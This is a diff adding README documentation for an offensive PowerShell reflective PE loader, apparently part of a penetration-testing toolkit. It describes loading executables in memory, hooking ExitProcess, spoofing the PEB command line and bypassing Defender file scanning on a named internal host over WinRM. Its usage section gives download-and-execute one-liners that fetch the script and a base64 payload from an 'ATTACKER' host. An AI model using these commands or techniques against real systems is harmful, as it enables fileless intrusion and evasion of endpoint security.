@@ -74,3 +74,54 @@ base, ep_rva = peloader.map_pe(pe_data)
 - Python 3.6+ on Windows (uses `ctypes.windll`)
 - No external dependencies (stdlib only)
 - Target PE must be x86-64
+
+# peloader.ps1 — PowerShell Reflective PE Loader
+
+Reflective PE64 loader for Windows. Maps a PE into the current process, resolves imports, applies relocations, patches the PEB command line, and runs the entry point in a new thread. Designed for IEX delivery (no here-strings — uses `Add-Type -MemberDefinition`).
+
+## How It Works
+
+1. Reads PE from file, base64 string, or URL (base64-encoded)
+2. Allocates RWX memory and maps PE headers + sections
+3. Processes base relocations (IMAGE_REL_BASED_DIR64)
+4. Resolves imports via IAT (LoadLibraryA + GetProcAddress)
+5. **IAT hooks**: `ExitProcess` → `ExitThread` (prevents host process termination)
+6. Sets correct page protections per section characteristics
+7. Optionally patches the PEB `ProcessParameters.CommandLine` for argument spoofing
+8. Runs the entry point in a new thread with 8MB stack
+
+## Usage
+
+```powershell
+# Via IEX (remote delivery)
+IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/peloader.ps1')
+
+# Then invoke directly:
+Invoke-PELoader -PEData $bytes -CmdLine "app.exe -f chrome"
+
+# Or via the main block:
+# From file
+.\peloader.ps1 -Path C:\path\to\file.exe -Arguments "-f chrome"
+
+# From base64 string
+.\peloader.ps1 -Base64 "TVqAAA..." -Arguments "-f chrome"
+
+# From URL (base64-encoded PE)
+.\peloader.ps1 -Url http://ATTACKER/payload.b64 -Arguments "-f chrome" -ExeName "tool.exe"
+```
+
+## Engagement Context
+
+Developed for cl-2 to run executables on MGMT01 (10.1.123.40) via WinRM without touching disk (bypassing Defender file scanning). The `ExitProcess → ExitThread` IAT hook prevents the loaded PE from killing the WinRM host process (wsmprovhost.exe).
+
+## Limitations
+
+- PE64 only (PE32 not supported)
+- No TLS callback handling — PEs with TLS callbacks may crash
+- Go/Rust runtimes are generally incompatible with reflective loading (they expect to own the process)
+- Defender's AMSI may still scan the PowerShell script content in memory
+
+## Requirements
+
+- PowerShell 5.1+ on Windows
+- Target PE must be x64
